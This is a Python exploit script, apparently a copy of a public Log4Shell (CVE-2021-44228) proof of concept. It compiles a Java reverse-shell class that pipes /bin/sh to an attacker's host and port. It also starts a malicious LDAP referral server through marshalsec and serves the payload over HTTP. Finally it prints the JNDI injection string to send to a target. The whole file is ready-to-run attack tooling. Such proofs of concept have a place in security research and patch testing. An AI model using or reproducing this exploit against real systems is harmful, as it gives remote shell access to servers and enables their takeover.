#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()
JAVA_PATH = "/full/path/to/jdk1.8.0_102/bin"


def generate_payload(userip: str, lport: int) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Malic {

    public Malic() throws Exception { 
        String host="%s";
        int port=%d;
	    String cmd="/bin/sh";
	    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
	    Socket s=new Socket(host,port);
	    InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
   	    while(!s.isClosed()) {
   	    	while(pi.available()>0)
				so.write(pi.read());
    	        while(pe.available()>0)
    	            so.write(pe.read());
    	        while(si.available()>0)
    	            po.write(si.read());
    	        so.flush();
    	        po.flush();
    	        Thread.sleep(50);
	            try {
    	            p.exitValue();
	                break;
    	        }
	            catch (Exception e) {
            		//e.printStackTrace();
	            }
		};
        p.destroy();
        s.close();
	} 
}
""" % (userip, lport)

    
    # writing the exploit to Malic.java file
    p = Path("Malic.java")

    try:
        p.write_text(program)
        # java_path = "jdk1.8.0_20/bin/javac"
        # subprocess.run([os.path.join(CUR_FOLDER, java_path), str(p)])
        subprocess.run([f'{JAVA_PATH}/javac', str(p)])
        	
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Java class created success')


def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)

    print(Fore.GREEN + '[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> bool:
	# java_path = 'jdk1.8.0_20/bin/java'
	
    exit_code = subprocess.call([
        f'{JAVA_PATH}/java',
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0


def ldap_server(userip: str, lport: int) -> None:
	# This script started the malicious local LDAP server.
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Malic".format(userip, lport)
    
    # java_path = 'jdk1.8.0_20/bin/java'
    subprocess.run([
        f'{JAVA_PATH}/java',
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    init(autoreset=True)
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Original: Github repo: https://github.com/kozmer/log4j-shell-poc
""")

    parser = argparse.ArgumentParser(description='log4shell PoC')
    parser.add_argument('--userip',
                        metavar='userip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    parser.add_argument('--lport',
                        metavar='lport',
                        type=int,
                        default='9001',
                        help='Netcat Port')

    args = parser.parse_args()

    try:
        if not check_java():
            print(Fore.RED + f'[-] Java "{JAVA_PATH}" not found.')
            raise SystemExit(1)
        payload(userip=args.userip, webport=args.webport, lport=args.lport)
    except KeyboardInterrupt:
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
